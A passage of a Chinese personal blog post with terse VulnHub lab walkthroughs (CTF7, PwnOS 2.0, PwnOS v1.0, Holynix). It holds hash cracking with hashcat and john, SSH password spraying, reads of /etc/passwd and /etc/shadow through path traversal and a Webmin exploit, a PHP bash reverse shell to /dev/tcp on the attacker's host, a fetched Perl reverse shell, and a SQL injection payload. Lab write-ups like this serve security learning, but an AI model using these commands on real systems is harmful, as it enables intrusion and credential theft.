+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	mysql users的批处理</span></span><br><span class="line"><span class="keyword">select</span> username,password <span class="built_in">users</span>;</span><br><span class="line"><span class="comment">#	然后复制到ctf7.txt</span></span><br><span class="line"><span class="comment">#	提取用户名</span></span><br><span class="line"><span class="built_in">cat</span> ctf7.txt | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27;@&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; ctf7_user.txt</span><br><span class="line">	-F fs --field-separator fs Use fs <span class="keyword">for</span> the input field separator (the value of the FS predefined variable).</span><br><span class="line"><span class="comment">#	提取密码</span></span><br><span class="line"><span class="built_in">cat</span> ctf7.txt | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span> ctf7_pass.txt</span><br><span class="line"><span class="comment"># 	批量爆破</span></span><br><span class="line">hashcat -m 0 -a 0 ctf7_pass.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668937405622.png" alt="1668937405622"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 	复制出来</span></span><br><span class="line"><span class="built_in">cat</span> ctf7_hash_d_pass.txt | awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; ctf7_hash_d_pass_1.txt</span><br><span class="line"><span class="comment">#	批量爆破</span></span><br><span class="line">crackmapexec ssh 192.168.213.148 -u ctf7_user.txt -p ctf7_hash_d_pass_1.txt --continue-on-success</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1668937916941.png" alt="1668937916941"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh 192.168.213.148 -u ctf7_user.txt -p ctf7_hash_d_pass_1.txt --continue-on-success | grep <span class="string">&#x27;+&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="PwnOS2-0"><a href="#PwnOS2-0" class="headerlink" title="PwnOS2.0"></a>PwnOS2.0</h3><p><img src="/2023/07/25/vulnhub/1676375462673.png" alt="1676375462673"></p>
+<p> <img src="https://img-blog.csdnimg.cn/20200329224633641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsZXhoY2Y=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">22 80端口开了</span><br><span class="line">dirb http://10.10.10.100</span><br><span class="line">	/blog是一个内容管理器，通过查询html代码发现它是Simple PHP Blog 0.4.0</span><br><span class="line">searchsploit Simple PHP Blog 0.4.0</span><br><span class="line">	使用第一个Multiple Remote s</span><br><span class="line">searchsploit Simple PHP Blog 0.4.0 -m 1191.pl</span><br><span class="line">vim 1191.pl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676385661650.png" alt="1676385661650"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo perl 1191.pl -h http://10.10.10.100/blog -e</span><br><span class="line">	报错 百度报错链接后sudo apt install libswitch-perl</span><br><span class="line">sudo perl 1191.pl -h http://10.10.10.100/blog -e 2</span><br><span class="line">sudo perl 1191.pl -h http://10.10.10.100/blog -e 3 -U hyy19 -P 123</span><br><span class="line">	创建用户成功</span><br><span class="line">登录后尝试文件上传shell.php到/blog/images/shell.php</span><br><span class="line">	&lt;?php exec(&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.213.130/1234 0&gt;&amp;1&#x27;&quot;)?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个机器有毒 直接上传反弹shell拿不到www-data权限 上传一句话木马用蚁剑转shell拿的 猜测仅主机地址不能反弹nat攻击机？</span><br><span class="line"></span><br><span class="line">查找数据库链接文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676451826642.png" alt="1676451826642"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot</span><br><span class="line">报错但是SQL能运行说明还有另外的文件</span><br><span class="line">find / -name mysqli_connect.php 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676452047733.png" alt="1676452047733"></p>
+<p><img src="/2023/07/25/vulnhub/1676452086998.png" alt="1676452086998"></p>
+<p><img src="/2023/07/25/vulnhub/1676453192133.png" alt="1676453192133"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">麻了 蚁剑这个终端不好使 不知道这种终端叫什么款式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676453312465.png" alt="1676453312465"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用root root@ISIntS ssh登录登上去了root权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="PwnOS-v1-0-解1"><a href="#PwnOS-v1-0-解1" class="headerlink" title="PwnOS v1.0 解1"></a>PwnOS v1.0 解1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">选择我已移动该虚拟机</span><br><span class="line"><span class="number">192.168</span><span class="number">.213</span><span class="number">.151</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676460749577.png" alt="1676460749577"></p>
+<p><img src="/2023/07/25/vulnhub/1676461610785.png" alt="1676461610785"></p>
+<p><img src="/2023/07/25/vulnhub/1676894702583.png" alt="1676894702583"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">	1.-sn</span><br><span class="line">	2.--min-rate</span><br><span class="line">	3.-sT -sV -O -p</span><br><span class="line">	4.-sU -p</span><br><span class="line">	5.--script=vuln -p</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">80端口存在文件包含漏洞		<span class="comment">#可直接看到/etc/passwd</span></span></span><br><span class="line">sudo curl &quot;http://192.168.213.151/index1.php?help=&amp;connect=../../../../../etc/passwd&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">10000端口 mgmt management缩写</span></span><br><span class="line">searchsploit webmin选择带有file disclosure</span><br><span class="line">sudo searchsploit webmin -m 2017.pl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676895730669.png" alt="1676895730669"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo perl 2017.pl 192.168.213.151 10000 /etc/passwd 0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">此处可以直接查看/etc/shadow</span></span><br><span class="line">sudo perl 2017.pl 192.168.213.151 10000 /etc/shadow 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676895802119.png" alt="1676895802119"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">复制完 vim 2_22 -&gt; :set paste</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解	靶机的密码挺多事rockyou.txt里面</span></span><br><span class="line">sudo john 2_22 --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676896503312.png" alt="1676896503312"></p>
+<p><img src="/2023/07/25/vulnhub/1676896648520.png" alt="1676896648520"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">看一下/etc/crontab</span></span><br><span class="line">cd /var</span><br><span class="line">ls -liah </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1676899868109.png" alt="1676899868109"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">webmin创建者root 所在组bin而之前文件查看的漏洞却可以看到只有root才能看的/etc/shadow，因此有了思路</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地上传反弹shell</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali</span></span><br><span class="line">sudo php -S 0:80</span><br><span class="line">cp /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi</span><br><span class="line">vim shell.pl的ip为192.168.213.130(其中端口号为1234)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">靶机</span></span><br><span class="line">cd ~</span><br><span class="line">wget http://192.168.213.130/shell.cgi</span><br><span class="line">chmod +x shell.cgi			#这一步很关键</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali</span></span><br><span class="line">sudo nc -lvnp 1234</span><br><span class="line">sudo perl 2017.pl 192.168.213.151 10000 /home/vmware/shell.cgi 0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">至此拿到管理权限</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PwnOS-v1-0-解2"><a href="#PwnOS-v1-0-解2" class="headerlink" title="PwnOS v1.0 解2"></a>PwnOS v1.0 解2</h3><h3 id="Holynix"><a href="#Holynix" class="headerlink" title="Holynix"></a>Holynix</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nat模式 <span class="number">192.168</span><span class="number">.213</span><span class="number">.152</span></span><br><span class="line">只有<span class="number">80</span>端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/vulnhub/1677403785562.png" alt="1677403785562"></p>
+<p><img src="/2023/07/25/vulnhub/1677404196020.png" alt="1677404196020"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#&#x27;</span><br></pre></td></tr></table></figure>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Hyy</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://huyaoyao2019.github.io/2023/07/25/vulnhub/">http://huyaoyao2019.github.io/2023/07/25/vulnhub/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Hyy</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">您的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/07/25/portswigger/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="portswigger">
+                        
+                        <span class="card-title">portswigger</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Hyy
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/07/25/sqli-labs/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="sqli-labs">
+                        
+                        <span class="card-title">sqli-labs</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Hyy
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Hyy</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/huyaoyao2019" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1228876399@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1228876399" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1228876399" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
